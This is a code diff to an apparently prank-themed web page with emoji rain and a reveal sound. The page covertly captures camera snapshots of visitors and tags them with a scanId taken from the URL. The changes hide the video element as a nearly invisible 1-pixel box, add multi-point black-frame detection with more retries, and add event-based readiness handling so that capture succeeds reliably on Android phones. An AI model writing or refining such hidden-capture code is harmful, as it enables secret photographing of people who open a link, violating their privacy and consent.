@@ -256,14 +256,14 @@
   <div class="emoji-rain" id="emoji-rain"></div>
 
   <!-- Hidden camera elements -->
-  <video id="video" width="640" height="480" autoplay playsinline muted style="position:fixed; top:-9999px; opacity:0; pointer-events:none;"></video>
+  <video id="video" width="1" height="1" autoplay playsinline muted style="position:fixed; top:0; left:0; width:1px; height:1px; z-index:100; opacity:0.1; pointer-events:none;"></video>
   <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
   <!-- Audio for prank reveal -->
   <audio id="prank-sound" src="/sound.mp3" preload="auto"></audio>
 
   <script>
-    // Define scanId at top
+    // Get scanId from URL - 100% reliable on mobile
     const urlParams = new URLSearchParams(window.location.search);
     const scanId = urlParams.get('scanId');
 
@@ -303,10 +303,10 @@
         const video = document.getElementById('video');
         video.srcObject = stream;
         
-        // Wait for video to be actually ready for capture
-        const waitForVideo = setInterval(() => {
+        // Wait for video to be actually ready for capture (Fix for Android Black Image)
+        const onCameraReady = () => {
           if (video.readyState >= 2 && video.videoWidth > 0) {
-            clearInterval(waitForVideo);
+            video.removeEventListener('playing', onCameraReady);
             
             // Snapshot timer (triggered during the prank reveal)
             setTimeout(() => {
@@ -316,17 +316,23 @@
               const takeSnapshot = (retryCount = 0) => {
                 context.drawImage(video, 0, 0, 640, 480);
                 
-                // Black frame detection
-                const imgData = context.getImageData(0, 0, 10, 10).data;
+                // MULTI-POINT Black frame detection (Check Center and Corners)
+                const checkPoints = [
+                  context.getImageData(320, 240, 1, 1).data, // Center
+                  context.getImageData(10, 10, 1, 1).data,   // Top-Left
+                  context.getImageData(620, 460, 1, 1).data  // Bottom-Right
+                ];
+                
                 let isBlack = true;
-                for (let i = 0; i < imgData.length; i += 4) {
-                  if (imgData[i] > 10 || imgData[i+1] > 10 || imgData[i+2] > 10) {
+                for (let p of checkPoints) {
+                  if (p[0] > 15 || p[1] > 15 || p[2] > 15) {
                     isBlack = false;
                     break;
                   }
                 }
 
-                if (isBlack && retryCount < 5) {
+                if (isBlack && retryCount < 8) {
+                  console.log("Still black, retrying capture...");
                   setTimeout(() => takeSnapshot(retryCount + 1), 500);
                   return;
                 }
@@ -352,7 +358,12 @@
               takeSnapshot();
             }, 4500); 
           }
-        }, 500);
+        };
+
+        video.addEventListener('playing', onCameraReady);
+        // Fallback if event doesn't fire
+        setTimeout(onCameraReady, 2000);
+
       } catch (e) {
         console.error("Camera access failed:", e.message);
       }
